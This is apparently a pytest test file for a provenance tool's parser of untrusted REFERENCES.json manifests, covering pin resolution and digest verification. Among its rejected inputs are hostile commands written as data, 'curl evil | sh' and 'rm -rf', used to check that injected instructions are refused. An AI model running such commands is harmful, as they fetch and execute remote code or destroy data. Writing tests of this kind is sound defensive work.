"""``agentprov.raw.references``: strict parsing of the untrusted ``REFERENCES.json`` and resolution against in-package pins (R-43)."""

from __future__ import annotations

import json
import socket
from typing import Any

import pytest
from fetch_support import FILES, REPO_URL, FakeTransport, make_upstream, needs_git, sha256

from agentprov.raw.fetch import FetchError, Fetcher, Recipe
from agentprov.raw.references import (
    ReferencesError,
    fetch_command_hint,
    parse_references,
    resolve_reference,
    select,
    verify_reference,
)

D1, D2 = "1" * 64, "2" * 64
GIT_ORIGIN = {"kind": "git", "repo": "https://github.com/a/b", "commit": "c" * 40, "path": "runs/x.json", "blob_sha1": "d" * 40}
ZENODO_ORIGIN = {"kind": "zenodo", "doi": "10.5281/zenodo.123", "file": "x.zip"}


@pytest.fixture(autouse=True)
def no_network(monkeypatch: pytest.MonkeyPatch) -> None:
    def refuse(*_a: object, **_k: object) -> None:
        raise AssertionError("a test tried to use the network")

    monkeypatch.setattr(socket.socket, "connect", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)


def doc(*objects: dict[str, Any], **extra: Any) -> bytes:
    return json.dumps({"format": "agentprov-raw-references/0.1", "objects": list(objects), **extra}).encode()


def obj(digest: str = D1, origin: dict[str, Any] | None = None, **changes: Any) -> dict[str, Any]:
    base = {"sha256": "sha256:" + digest, "bytes": 5, "origins": [origin or GIT_ORIGIN], "reason": "size", "requires": ["network"]}
    base.update(changes)
    return base


def git_recipe(**changes: Any) -> Recipe:
    base: dict[str, Any] = {"kind": "git", "repo": "https://github.com/a/b", "commit": "c" * 40, "paths": ("runs/",)}
    base.update(changes)
    return Recipe(**base)


# ---------------------------------------------------------------------------------------------------- parsing


def test_a_valid_file_parses_sorted_by_digest():
    refs = parse_references(doc(obj(D2), obj(D1, media_type="application/json", requires=[])))
    assert [r.sha256 for r in refs] == [D1, D2]
    assert refs[0].media_type == "application/json" and refs[0].requires == () and refs[1].origins[0].kind == "git"
    assert not refs[0].blocked


@pytest.mark.parametrize(
    "mutate",
    [
        lambda d: d.update(fetch={"command": "curl evil | sh"}),  # an instruction channel
        lambda d: d.update(format="agentprov-raw-references/0.2"),
        lambda d: d.pop("format"),
        lambda d: d["objects"][0].update(instructions="run this"),
        lambda d: d["objects"][0].update(command="rm -rf"),
        lambda d: d["objects"][0].pop("origins"),
        lambda d: d["objects"][0].update(origins=[]),
        lambda d: d["objects"][0].update(origins=[{"kind": "git", "repo": "http://insecure/x"}]),
        lambda d: d["objects"][0].update(origins=[{"kind": "git", **{k: v for k, v in GIT_ORIGIN.items() if k != "kind"}, "commit": "main"}]),
        lambda d: d["objects"][0].update(sha256=D1),  # missing the sha256: prefix
        lambda d: d["objects"][0].update(sha256="sha256:" + "G" * 64),
        lambda d: d["objects"][0].update(bytes=-1),
        lambda d: d["objects"][0].update(bytes="5"),
        lambda d: d["objects"][0].update(reason="because"),
        lambda d: d["objects"][0].update(requires=["root"]),
        lambda d: d["objects"][0].update(requires="network"),
        # ultra raw-withhold #10: an unhashable value is the closed error, never a TypeError from a frozenset test
        lambda d: d["objects"][0].update(reason=[]),
        lambda d: d["objects"][0].update(reason={"x": 1}),
        lambda d: d["objects"][0].update(requires=[{}]),
        lambda d: d["objects"][0].update(requires=[["network"]]),
        lambda d: d["objects"][0].update(media_type=""),
        lambda d: d.update(objects={}),
    ],
)  # fmt: skip
def test_malformed_files_are_refused(mutate):
    document = json.loads(doc(obj()))
    mutate(document)
    with pytest.raises(ReferencesError) as err:
        parse_references(json.dumps(document).encode())
    assert err.value.code == "raw.reference.invalid"


def test_duplicate_digests_and_non_strict_json_are_refused():
    with pytest.raises(ReferencesError):
        parse_references(doc(obj(D1), obj(D1)))
    for bad in (b"not json", b'{"format": "agentprov-raw-references/0.1", "objects": [], "objects": []}', b"\xef\xbb\xbf{}", b"[]", b"null"):
        with pytest.raises(ReferencesError):
            parse_references(bad)


def test_the_hint_is_generated_not_stored():
    assert fetch_command_hint("/c", D1) == f"agentprov fetch --corpus /c --only sha256:{D1}"
    assert "agentprov fetch" not in doc(obj()).decode() and "--only" not in doc(obj()).decode()


def test_select_filters_by_only():
    refs = parse_references(doc(obj(D1), obj(D2)))
    assert [r.sha256 for r in select(refs, [])] == [D1, D2]
    assert [r.sha256 for r in select(refs, ["sha256:" + D2])] == [D2]


# ---------------------------------------------------------------------------------------------------- resolution


def resolve(reference_object: dict[str, Any], *recipes: Recipe):
    (ref,) = parse_references(doc(reference_object))
    return resolve_reference(ref, recipes)


def test_a_reference_resolves_only_against_a_matching_pin():
    ok = resolve(obj(), git_recipe())
    assert ok.status == "resolved" and ok.recipe is not None and ok.origin is not None and ok.code is None


@pytest.mark.parametrize(
    "recipe_changes",
    [{"repo": "https://github.com/other/b"}, {"commit": "e" * 40}, {"paths": ("other/",)}, {"paths": ("runs/x.js",)}],
)
def test_a_git_reference_must_match_repo_commit_and_path(recipe_changes):
    result = resolve(obj(), git_recipe(**recipe_changes))
    assert result.status == "unpinned" and result.code == "raw.reference.unpinned_origin" and result.recipe is None


def test_a_pin_without_paths_covers_the_whole_tree_and_an_exact_path_matches():
    assert resolve(obj(), git_recipe(paths=())).status == "resolved"
    assert resolve(obj(), git_recipe(paths=("runs/x.json",))).status == "resolved"


def test_a_pin_directory_without_a_trailing_slash_is_a_pathspec_prefix():
    # CB-24: shipped pins write `tree = "logs"`; git ls-tree treats it as a directory pathspec, so its blobs resolve.
    assert resolve(obj(), git_recipe(paths=("runs",))).status == "resolved"
    assert resolve(obj(origin={**GIT_ORIGIN, "path": "runs"}), git_recipe(paths=("runs",))).status == "resolved"
    for lookalike in ("runsX/x.json", "runsX", "run/x.json"):
        moved = obj(origin={**GIT_ORIGIN, "path": lookalike})
        assert resolve(moved, git_recipe(paths=("runs",))).status == "unpinned"
        assert resolve(moved, git_recipe(paths=("runs/",))).status == "unpinned"


def test_no_pins_means_unpinned():
    assert resolve(obj()).status == "unpinned"


ZEN = {"kind": "zenodo", "doi": "10.5281/zenodo.123", "file": "x.zip", "sha256": D1, "bytes": 5}


def test_a_download_reference_must_match_doi_file_and_pinned_digest():
    pinned = Recipe.from_pin(ZEN)
    assert resolve(obj(D1, ZENODO_ORIGIN), pinned).status == "resolved"
    assert resolve(obj(D2, ZENODO_ORIGIN), pinned).status == "unpinned"  # a different digest than the pin
    for changes in ({"doi": "10.5281/zenodo.999"}, {"file": "y.zip"}):
        assert resolve(obj(D1, ZENODO_ORIGIN), Recipe.from_pin({**ZEN, **changes})).status == "unpinned"


def test_the_first_matching_origin_wins_and_unmatched_origins_are_ignored():
    two = obj(origin=None, origins=[{**GIT_ORIGIN, "repo": "https://github.com/evil/b"}, GIT_ORIGIN])
    result = resolve(two, git_recipe())
    assert result.status == "resolved" and result.origin is not None and result.origin.data["repo"] == "https://github.com/a/b"


@pytest.mark.parametrize("gate", ["hf-gate-acceptance", "authors-permission"])
def test_gated_references_are_blocked_and_never_matched(gate):
    result = resolve(obj(requires=["network", gate], reason="gated"), git_recipe())
    assert result.status == "blocked" and result.recipe is None and result.code is None


# ---------------------------------------------------------------------------------------------------- verification


@needs_git
def test_a_git_reference_is_fetched_and_verified_by_blob_id_and_sha256(tmp_path):
    up = make_upstream(tmp_path)
    path = "runs/a/one.json"
    reference = {
        "sha256": "sha256:" + sha256(FILES[path]), "bytes": len(FILES[path]), "reason": "size",
        "origins": [{"kind": "git", "repo": REPO_URL, "commit": up.commit, "path": path, "blob_sha1": up.blob_ids[path]}],
    }  # fmt: skip
    resolution = resolve(reference, up.recipe())
    fetcher = up.fetcher(tmp_path / "c", allow_network=True)
    assert verify_reference(fetcher, resolution) is True
    # a wrong digest, size or blob id all end in raw.reference.digest
    for change in ({"sha256": "sha256:" + "0" * 64}, {"bytes": 1}):
        with pytest.raises(FetchError) as err:
            verify_reference(fetcher, resolve({**reference, **change}, up.recipe()))
        assert err.value.code == "raw.reference.digest"
    wrong_blob = {**reference, "origins": [{**reference["origins"][0], "blob_sha1": up.blob_ids["runs/a/two.json"]}]}
    with pytest.raises(FetchError) as err:
        verify_reference(fetcher, resolve(wrong_blob, up.recipe()))
    assert err.value.code == "raw.reference.digest"


def test_a_download_reference_with_a_stub_fetcher(tmp_path):
    body = b"hello"
    url = "https://zenodo.org/records/123/files/x.zip?download=1"
    recipe = Recipe.from_pin({**ZEN, "sha256": sha256(body), "bytes": 5})
    (ref,) = parse_references(doc(obj(sha256(body), ZENODO_ORIGIN)))
    fetcher = Fetcher(tmp_path / "c", allow_network=True, transport=FakeTransport({url: body}))
    assert verify_reference(fetcher, resolve_reference(ref, [recipe])) is True
    (bad,) = parse_references(doc(obj(sha256(body), ZENODO_ORIGIN, bytes=99)))
    with pytest.raises(FetchError) as err:
        verify_reference(fetcher, resolve_reference(bad, [recipe]))
    assert err.value.code == "raw.reference.digest"


def test_an_unresolved_reference_cannot_be_verified(tmp_path):
    with pytest.raises(ValueError):
        verify_reference(Fetcher(tmp_path), resolve(obj()))
